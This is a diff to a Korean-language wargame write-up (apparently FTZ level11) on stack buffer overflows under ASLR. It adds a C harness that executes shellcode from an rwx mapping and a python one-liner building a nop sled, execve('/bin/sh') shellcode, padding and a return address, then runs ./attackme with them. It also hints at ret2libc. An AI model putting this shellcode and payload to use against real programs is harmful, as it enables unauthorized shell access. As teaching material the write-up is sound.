@@ -37,6 +37,35 @@ buffer에 shellcode를 넣어놓은 후, return address를 buffer의 주소값�
 그러나 프로그램을 실행시킬때마다 stack의 시작주소가 바뀌는 ASLR(Adress Space Layout Randomization)이 걸려있기 때문에 buffer의 주소값도 매번 바뀌게 되어 shellcode가 제대로 실행하지 않게 된다.  
 따라서 buffer의 주소값이 바뀌더라도 최대한 shellcode 실행 성공률을 높이기 위해 shellcode앞에 nop(no operation; 0x90)을 채워넣어서 정확하게 shellcode 처음부분에 떨어지지 않더라도 nop으로 채워져있는 곳에 떨어지게 된다면 nop을 따라서 쭉 내려오다가 결국 shellcode가 실행이 되게끔 만든다.  
 
+```c
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <string.h>
+
+void (*fp)();
+
+int main(int argc, char** argv)
+{
+        void* memory = mmap(NULL, 100, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+
+        strcpy(memory, argv[1]);
+        fp = memory;
+        fp();
+        return 0;
+}
+```
+
+위는 shellcode가 제대로 동작하는 shellcode인지 확인하기위해서 rwx메모리영역을 임의로 mapping한 후에 shellcode를 적고 실행하는 코드이다.  
+
+```sh
+# \x90 * 200 = nop sled
+# \x31...\x80 = shellcode
+# A * 43 = padding
+# \xd0\xea\xff\xbf = return address = address of str(물론 ASLR로 인해 주소가 맞지 않다. 그렇기 때문에 nop sled를 넣는 것이다.)
+$ python -c "print('\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'+'A'*43+'\xd0\xea\xff\xbf')" > ./tmp/argument
+$ ./attackme `cat ./tmp/argument`
+```
+
 ### Method 2 (Using environment variable & shellcode)
 
 shellcode를 stack에 저장하면 stack ASLR때문에 실행하기가 힘들어진다. 따라서 비교적 고정적인 곳에 shellcode를 저장하려고 한다. 바로 환경변수이다.  
@@ -67,4 +96,6 @@ int main(void)
 
 첫번째, 두번째 방법 모두 좀 불안정한 방법이다. 첫번째 방법같은경우, stack ASLR때문에 buffer의 주소값이 계속 바뀌고, 두번째 방법같은경우에도, 상황에 따라 살짝씩 달라지기 때문이다. (직접 해보면 알 수 있다. 안먹힐때가 많다.)  
 세번째 방법으로 libc 라이브러리에있는 함수를 사용하는 방법이다. 다행히 라이브러리에는 ASLR이 걸려있지 않아서 프로그램을 여러번 실행하더라도 라이브러리가 동일한 메모리 공간에 mapping이 된다. 따라서 libc에있는 system함수를 찾아서 system함수의 주소값을 return address에 넣어주면 system함수가 실행이 될 것이다. 하지만 여기서는 system함수에 "/bin/sh"과 같은 인자를 넣어주어야 한다. 이것은 calling convention을 잘 생각해보면 충분히 전달해줄 수 있다.  
-추가적인 힌트를 더 드리자면, "/bin/sh" 문자열은 이미 libc 라이브러리에 존재한다.
+추가적인 힌트를 더 드리자면, "/bin/sh" 문자열은 이미 libc 라이브러리에 존재한다.  
+
+[블로그](https://mysigyeong.github.io/CTF/ftz/level11.html)에 payload가 잘 정리되어있습니다. 여기를 참고해주세요.
